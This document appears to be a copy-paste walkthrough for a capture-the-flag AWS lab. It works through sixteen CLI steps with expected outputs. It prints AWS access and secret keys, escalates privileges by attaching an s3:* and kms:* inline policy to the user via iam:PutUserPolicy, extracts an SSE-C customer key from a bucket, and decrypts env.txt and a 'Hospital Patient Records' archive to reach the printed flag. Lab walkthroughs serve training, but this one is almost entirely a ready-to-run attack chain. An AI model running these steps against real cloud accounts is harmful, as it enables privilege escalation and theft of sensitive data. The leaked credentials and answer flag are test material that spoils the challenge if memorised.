# COMPLETE AWS LAB COMMANDS - ALL STEPS WITH HIGHLIGHTS!

## 📋 EVERY COMMAND YOU NEED FOR THIS LAB (COPY-PASTE READY!)

---

## STEP 1: CONFIGURE AWS CLI
```cmd
aws configure
```
**Enter these values:**
```
AWS Access Key ID [None]: AKIAQ3EGUZME3BAXFV7D
AWS Secret Access Key [None]: 2ETmQExURN6kBI0/2kClgcuTLyVBD5idkrJSFvsY
Default region name [None]: us-east-1
Default output format [None]: json
```

---

## STEP 2: VERIFY YOUR IDENTITY
```cmd
aws sts get-caller-identity
```
**🔍 LOOK FOR:**
```json
{
    "UserId": "AIDAQ3EGUZME24ILVB44T",
    "Account": "058264439561",
    ➡️ "Arn": "arn:aws:iam::058264439561:user/BackupReader1"
}
```

---

## STEP 3: CHECK YOUR PERMISSIONS BOUNDARY
```cmd
aws iam get-user --query "User.PermissionsBoundary" --output text
```
**🔍 LOOK FOR:**
```
➡️ arn:aws:iam::058264439561:policy/PermissionBoundaryPolicy       Policy
```

---

## STEP 4: GET POLICY DETAILS
```cmd
aws iam get-policy --policy-arn arn:aws:iam::058264439561:policy/PermissionBoundaryPolicy
```
**🔍 LOOK FOR:**
```json
{
    "Policy": {
        ➡️ "PolicyName": "PermissionBoundaryPolicy",
        ➡️ "DefaultVersionId": "v3"
    }
}
```

---

## STEP 5: SEE YOUR EXACT PERMISSIONS (CRITICAL!)
```cmd
aws iam get-policy-version --policy-arn arn:aws:iam::058264439561:policy/PermissionBoundaryPolicy --version-id v3
```
**🔍 LOOK FOR THESE SPECIFIC PERMISSIONS:**
```json
{
    "PolicyVersion": {
        "Document": {
            "Statement": [
                {
                    "Action": [
                        ➡️ "s3:ListBucket",
                        ➡️ "s3:GetObject"
                    ],
                    "Effect": "Allow",
                    "Resource": [
                        ➡️ "arn:aws:s3:::securecopbakupbuk1",
                        "arn:aws:s3:::securecopbakupbuk1/*"
                    ]
                },
                {
                    "Action": [
                        ➡️ "kms:Decrypt"
                    ],
                    "Effect": "Allow",
                    "Resource": ➡️ "arn:aws:kms:us-east-1:058264439561:key/a7a251b3-c889-4dd1-9176-931c207c33d5"
                },
                {
                    "Action": [
                        ➡️ "iam:PutUserPolicy"  ⬅️ THIS IS THE KEY!
                    ],
                    "Effect": "Allow",
                    "Resource": ➡️ "arn:aws:iam::058264439561:user/BackupReader1"
                }
            ]
        }
    }
}
```

---

## STEP 6: CREATE POLICY.JSON FILE (MUST DO!)
```cmd
notepad policy.json
```
**Copy and paste this EXACT content:**
```json
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Effect": "Allow",
      "Action": [
        "s3:*"
      ],
      "Resource": [
        "arn:aws:s3:::securecopbakupbuk1",
        "arn:aws:s3:::securecopbakupbuk1/*"
      ]
    },
    {
      "Effect": "Allow",
      "Action": "kms:*",
      "Resource": "arn:aws:kms:us-east-1:058264439561:key/a7a251b3-c889-4dd1-9176-931c207c33d5"
    }
  ]
}
```
**Save the file (Ctrl+S) and close Notepad**

---

## STEP 7: ATTACH POLICY TO YOURSELF (PRIVILEGE ESCALATION!)
```cmd
aws iam put-user-policy --user-name BackupReader1 --policy-name KMSFullAccessPolicy --policy-document file://policy.json
```
**✅ If successful, there will be NO OUTPUT (that's good!)**

---

## STEP 8: CHECK EXISTING POLICIES
```cmd
aws iam list-attached-user-policies --user-name BackupReader1
```
**🔍 LOOK FOR:**
```json
{
    "AttachedPolicies": [
        {
            ➡️ "PolicyName": "UserPolicy",
            "PolicyArn": "arn:aws:iam::058264439561:policy/UserPolicy"
        }
    ]
}
```

---

## STEP 9: GET USERPOLICY DETAILS
```cmd
aws iam get-policy --policy-arn arn:aws:iam::058264439561:policy/UserPolicy
```
**🔍 LOOK FOR:**
```json
{
    "Policy": {
        ➡️ "PolicyName": "UserPolicy",
        ➡️ "DefaultVersionId": "v1"
    }
}
```

---

## STEP 10: SEE USERPOLICY PERMISSIONS
```cmd
aws iam get-policy-version --policy-arn arn:aws:iam::058264439561:policy/UserPolicy --version-id v1
```
**🔍 LOOK FOR:**
```json
{
    "PolicyVersion": {
        "Document": {
            "Statement": [
                {
                    "Action": [
                        ➡️ "iam:PutUserPolicy"  ⬅️ Confirms you can attach policies!
                    ],
                    "Effect": "Allow",
                    "Resource": "*"
                }
            ]
        }
    }
}
```

---

## STEP 11: LIST S3 BUCKET CONTENTS
```cmd
aws s3 ls s3://securecopbakupbuk1/
```
**🔍 LOOK FOR THESE FILES:**
```
                           PRE .BurpSuite/
2024-09-24 16:49:10        411 ➡️ Hospital+Patient+Records.zip
2024-09-24 16:48:40        411 ➡️ env.txt
2024-09-24 16:43:42        113 ➡️ key.txt
```

---

## STEP 12: DOWNLOAD KEY.TXT
```cmd
aws s3 cp s3://securecopbakupbuk1/key.txt .
```
**🔍 LOOK FOR:**
```
➡️ download: s3://securecopbakupbuk1/key.txt to .\key.txt
```

---

## STEP 13: VIEW KEY.TXT CONTENTS
```cmd
type key.txt
```
**🔍 LOOK FOR THESE (CRITICAL!):**
```
➡️ CustomerKey: ZhL8Zvaa3Xybf/sizoGwtrgKpxkxE46JJMiz1syVGQM=
➡️ CustomerKeyMD5: ESUzbd203tahLpxvA6LL4g==
```

---

## STEP 14: DOWNLOAD AND DECRYPT ENV.TXT
```cmd
aws s3api get-object --bucket securecopbakupbuk1 --key env.txt ./env9.txt --sse-customer-algorithm AES256 --sse-customer-key ZhL8Zvaa3Xybf/sizoGwtrgKpxkxE46JJMiz1syVGQM= --sse-customer-key-md5 ESUzbd203tahLpxvA6LL4g==
```
**🔍 LOOK FOR:**
```json
{
    ➡️ "SSECustomerAlgorithm": "AES256",
    "SSECustomerKeyMD5": "ESUzbd203tahLpxvA6LL4g=="
}
```

---

## STEP 15: DOWNLOAD AND DECRYPT THE ZIP FILE
```cmd
aws s3api get-object --bucket securecopbakupbuk1 --key Hospital+Patient+Records.zip ./Hospital9.zip --sse-customer-algorithm AES256 --sse-customer-key ZhL8Zvaa3Xybf/sizoGwtrgKpxkxE46JJMiz1syVGQM= --sse-customer-key-md5 ESUzbd203tahLpxvA6LL4g==
```
**🔍 LOOK FOR:**
```json
{
    ➡️ "SSECustomerAlgorithm": "AES256",
    "SSECustomerKeyMD5": "ESUzbd203tahLpxvA6LL4g=="
}
```

---

## STEP 16: VIEW THE FLAG! 🏁
```cmd
type env9.txt
```
**OR**
```cmd
notepad env9.txt
```

**🔍 LOOK FOR THIS:**
```
➡️ CWL{AWS_KMS_Key_chal!enge_Suc(es$}
```

---

## 📊 QUICK REFERENCE TABLE - ALL COMMANDS

| # | Command | Purpose |
|---|---------|---------|
| 1 | `aws configure` | Setup credentials |
| 2 | `aws sts get-caller-identity` | Verify login |
| 3 | `aws iam get-user --query "User.PermissionsBoundary" --output text` | Find restrictions |
| 4 | `aws iam get-policy --policy-arn arn:aws:iam::058264439561:policy/PermissionBoundaryPolicy` | Get policy details |
| 5 | `aws iam get-policy-version --policy-arn arn:aws:iam::058264439561:policy/PermissionBoundaryPolicy --version-id v3` | View your permissions |
| 6 | `notepad policy.json` | Create escalation policy |
| 7 | `aws iam put-user-policy --user-name BackupReader1 --policy-name KMSFullAccessPolicy --policy-document file://policy.json` | Attach policy (escalate!) |
| 8 | `aws iam list-attached-user-policies --user-name BackupReader1` | Check attached policies |
| 9 | `aws iam get-policy --policy-arn arn:aws:iam::058264439561:policy/UserPolicy` | Get UserPolicy details |
| 10 | `aws iam get-policy-version --policy-arn arn:aws:iam::058264439561:policy/UserPolicy --version-id v1` | View UserPolicy |
| 11 | `aws s3 ls s3://securecopbakupbuk1/` | List bucket contents |
| 12 | `aws s3 cp s3://securecopbakupbuk1/key.txt .` | Download key file |
| 13 | `type key.txt` | Get encryption key |
| 14 | `aws s3api get-object --bucket securecopbakupbuk1 --key env.txt ./env9.txt --sse-customer-algorithm AES256 --sse-customer-key ZhL8Zvaa3Xybf/sizoGwtrgKpxkxE46JJMiz1syVGQM= --sse-customer-key-md5 ESUzbd203tahLpxvA6LL4g==` | Decrypt env.txt |
| 15 | `aws s3api get-object --bucket securecopbakupbuk1 --key Hospital+Patient+Records.zip ./Hospital9.zip --sse-customer-algorithm AES256 --sse-customer-key ZhL8Zvaa3Xybf/sizoGwtrgKpxkxE46JJMiz1syVGQM= --sse-customer-key-md5 ESUzbd203tahLpxvA6LL4g==` | Decrypt zip file |
| 16 | `type env9.txt` | **GET THE FLAG!** |

---

## 🏁 FINAL FLAG:
```
CWL{AWS_KMS_Key_chal!enge_Suc(es$}
```

**Lab Complete!** ✅
